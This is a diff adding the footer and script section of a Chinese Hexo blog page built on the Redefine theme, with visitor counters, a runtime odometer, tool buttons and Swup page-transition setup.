+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
